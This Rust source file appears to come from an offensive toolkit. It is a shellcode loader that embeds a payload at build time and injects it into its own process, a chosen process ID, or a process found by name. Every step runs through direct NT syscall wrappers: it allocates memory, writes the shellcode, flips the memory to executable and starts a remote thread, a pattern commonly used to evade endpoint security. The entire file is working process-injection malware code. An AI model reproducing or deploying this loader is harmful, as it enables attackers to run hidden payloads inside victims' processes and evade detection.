use std::any::Any;
use std::panic;

#[allow(unused_imports)]
use crate::debug_error;
use crate::debug_info;
#[allow(unused_imports)]
use crate::debug_ok_msg;
#[allow(unused_imports)]
use crate::debug_error_msg;
#[allow(unused_imports)]
use crate::debug_base_msg;
#[allow(unused_imports)]
use crate::debug_base_hex;
#[allow(unused_imports)]
use crate::debug_success_msg;
#[allow(unused_imports)]
use crate::debug_base;
#[allow(unused_imports)]
use crate::debug_info_msg;


use crate::winapi::constants::PROCESS_ALL_ACCESS;
use crate::winapi::{syscall_wrapper::SyscallWrapper, types::HANDLE};
use crate::winapi::constants::STATUS_SUCCESS;

#[allow(dead_code)]
pub fn do_load()
{
    let result: Result<(), Box<dyn Any + Send>> = panic::catch_unwind(|| {
        let shell_code = get_shell_code();
        debug_success_msg!(format!("Shellcode loaded, size = {}", shell_code.len()));
        load(shell_code);
    });
    match result {
        Err(_) => debug_error_msg!(format!("An Error occured")),
        _ => ()
    }
}

#[cfg(all(feature = "payload_b64"))]
fn get_shell_code() -> Vec<u8> {
    let base64_shell_code = include_str!(env!("PAYLOAD_FILE_NAME"));
    crate::helpers::base64_to_vec(base64_shell_code)
}

#[cfg(all(feature = "payload_bin"))]
fn get_shell_code() -> Vec<u8> {
    let shell_code = include_bytes!(env!("PAYLOAD_FILE_NAME"));
    shell_code.to_vec()
}
 
#[cfg(all(feature = "inject_self", not(feature = "inject_proc_id"), not(feature = "inject_proc_name")))]
fn load(shell_code: Vec<u8>) -> bool {
    let ntdll = SyscallWrapper::new();
    let process_handle: HANDLE = -1;

    inner_load(&ntdll, shell_code, process_handle, true)
}

#[cfg(all(feature = "inject_proc_id", not(feature = "inject_self"), not(feature = "inject_proc_name")))]
fn load(shell_code: Vec<u8>) -> bool {
    let ntdll = SyscallWrapper::new();
    let process_id = String::from(env!("PROCESS_ID")).parse().unwrap();
    debug_info!(process_id);
    inner_load_with_id(&ntdll, process_id, shell_code)
}



#[cfg(all(feature = "inject_proc_name", not(feature = "inject_proc_id"), not(feature = "inject_self")))]
fn load(shell_code: Vec<u8>) -> bool {

    let ntdll = SyscallWrapper::new();

    let process_name = String::from(env!("PROCESS_NAME"));
    let mut process_id = 0;

    let mut return_length: u32 = 0;
    let return_length_ptr: *mut u32 = &mut return_length;
    let mut return_length_2: u32 = 0;
    let return_length_2_ptr: *mut u32 = &mut return_length_2;

    crate::debug_ok_msg!(format!("Call to NtQuerySystemInformation"));
    let mut res = ntdll.nt_query_system_information(crate::winapi::constants::SYSTEM_PROCESS_INFORMATION, &mut 0, 0, return_length_ptr);
    crate::debug_info_msg!(format!("Call to NtQuerySystemInformation : Result = {:#x}", res));
    if res as u32 != 0xc0000004 {
        debug_error_msg!("Failed to get size of process info list!");
        return false;
    }
    debug_success_msg!(format!("Size of process info list = {}", return_length));

    let mut data = vec![0u8; return_length as usize];

    loop {
        crate::debug_ok_msg!(format!("Call to NtQuerySystemInformation"));
        res = ntdll.nt_query_system_information(crate::winapi::constants::SYSTEM_PROCESS_INFORMATION, data.as_mut_ptr(), return_length , return_length_2_ptr);
        crate::debug_info_msg!(format!("Call to NtQuerySystemInformation : Result = {:#x}", res));
        if res as u32 == 0xc0000004 { //the nuumber of process changed before the previous call => retry
            debug_info_msg!("Process list changed, retrying....");
            return_length = return_length_2;
            continue;
        }
        if res != STATUS_SUCCESS {
            debug_error_msg!("Failed to get process info list!");
            return false;
        }
        
        debug_success_msg!("Processes Info list retrieved.");
        break;
    }

    let processes_info_list_ptr = data.as_ptr() as *const crate::winapi::structs::SYSTEM_PROCESS_INFORMATION;
    let mut current_ptr = processes_info_list_ptr;
    unsafe {
        loop {
            let system_proc_info = *current_ptr;
            //debug_info!(system_proc_info.NextEntryOffset);
            
            if system_proc_info.ImageName.Length != 0 {
                //debug_info!(system_proc_info.ImageName.Buffer.to_string().unwrap());
                if process_name.to_lowercase()  == system_proc_info.ImageName.Buffer.to_string().unwrap().to_lowercase() {
                    process_id = system_proc_info.UniqueProcessId;
                    break;
                }
            }


            if system_proc_info.NextEntryOffset == 0 {
                break;
            }

            current_ptr = (current_ptr as u64 + system_proc_info.NextEntryOffset as u64) as *const crate::winapi::structs::SYSTEM_PROCESS_INFORMATION;
        }
    }

    if process_id == 0 {
        debug_error_msg!(format!("Failed to find process whith name {}", process_name));
        return false;
    }
    debug_success_msg!(format!("Found process with id {}.", process_id));
    
    inner_load_with_id(&ntdll, process_id, shell_code)
}
 
#[allow(dead_code)]
fn inner_load_with_id(ntdll: &SyscallWrapper, process_id: isize, shell_code: Vec<u8>)  -> bool {
    let mut process_handle: HANDLE = 0;

    crate::debug_ok_msg!(format!("Call to NtOpenProcess"));
    let mut res = ntdll.nt_open_process(&mut process_handle, PROCESS_ALL_ACCESS, process_id);
    crate::debug_info_msg!(format!("Call to NtOpenProcess : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        debug_error_msg!("Failed to get Process Handle!");
        return false;
    }
    debug_success_msg!(format!("Process Handle #{} retrieved from process with id {}", process_handle, process_id ));

    if !inner_load(&ntdll, shell_code, process_handle, true) {
        return false;
    }


    crate::debug_ok_msg!(format!("Call to NtClose"));
    res = ntdll.nt_close(process_handle);
    crate::debug_info_msg!(format!("Call to NtClose : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        debug_error_msg!("Failed to close Process Handle!");
        return false;
    }
    debug_success_msg!(format!("Process Handle closed"));

    true
}


fn inner_load(ntdll: &SyscallWrapper, shell_code: Vec<u8>, process_handle: HANDLE, wait: bool) -> bool {

    use crate::winapi::constants::{MEM_RESERVE, MEM_COMMIT, PAGE_READWRITE, PAGE_EXECUTE_READ, THREAD_ALL_ACCESS};

    let mut size: usize = shell_code.len();
    let mut address: usize = 0;

    crate::debug_ok_msg!(format!("Call to NtAllocateVirtualMemory"));
    let mut res = ntdll.nt_allocate_virtual_memory(process_handle, &mut address,  &mut size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    crate::debug_info_msg!(format!("Call to NtAllocateVirtualMemory : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        debug_error_msg!(format!("Failed to allocate memory (size = {})!", size));
        return false;
    }
    debug_success_msg!(format!("Memory allocated : {}b at {:#x}", size, address));

    debug_info!(process_handle);

    let mut old_protect= 0u32;
    crate::debug_ok_msg!(format!("Call to NtProtectVirtualMemory"));
    res =  ntdll.nt_protect_virtual_memory(process_handle, &mut address, &mut size, PAGE_READWRITE, &mut old_protect);
    crate::debug_info_msg!(format!("Call to NtProtectVirtualMemory : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        debug_error_msg!("Failed to change memory protection!");
        return false;
    }
    debug_success_msg!("Memory protection changed to PAGE_READWRITE");

    let mut nb_of_bytes_written = 0usize;
    crate::debug_ok_msg!(format!("Call to NtWriteVirtualMemory"));
    res =  ntdll.nt_write_virtual_memory(process_handle, address, shell_code.as_ptr() as usize, shell_code.len(), &mut nb_of_bytes_written);
    crate::debug_info_msg!(format!("Call to NtWriteVirtualMemory : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        debug_error_msg!("Failed to write memory!");
        return false;
    }
    debug_success_msg!("Memory written");

    crate::debug_ok_msg!(format!("Call to NtProtectVirtualMemory"));
    res =  ntdll.nt_protect_virtual_memory(process_handle, &mut address, &mut size, PAGE_EXECUTE_READ, &mut old_protect);
    crate::debug_info_msg!(format!("Call to NtProtectVirtualMemory : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        debug_error_msg!("Failed to change memory protection!");
        return false;
    }
    debug_success_msg!("Memory protection changed to PAGE_EXECUTE_READ");
    
    let mut thread_handle: HANDLE = 0;
    crate::debug_ok_msg!(format!("Call to NtCreateThreadEx"));
    res =  ntdll.nt_create_thread_ex(&mut thread_handle, THREAD_ALL_ACCESS,process_handle, address);
    crate::debug_info_msg!(format!("Call to NtCreateThreadEx : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        debug_error_msg!("Failed to start thread!");
        return false;
    }
    debug_success_msg!("Thread executed");

    if wait {
        crate::debug_ok_msg!(format!("Call to NtWaitForSingleObject"));
        res =  ntdll.nt_wait_for_single_object(thread_handle);
        crate::debug_info_msg!(format!("Call to NtWaitForSingleObject : Result = {:#x}", res));
        if res != STATUS_SUCCESS {
            debug_error_msg!("Failed to wait!");
            return false;
        }
        debug_success_msg!("Thread ended");
    }

    crate::debug_ok_msg!(format!("Call to NtClose"));
    res = ntdll.nt_close(thread_handle);
    crate::debug_info_msg!(format!("Call to NtClose : Result = {:#x}", res));
    if res != STATUS_SUCCESS {
        debug_error_msg!("Failed to close Thread Handle!");
        return false;
    }
    debug_success_msg!(format!("Thread Handle closed"));

    true
}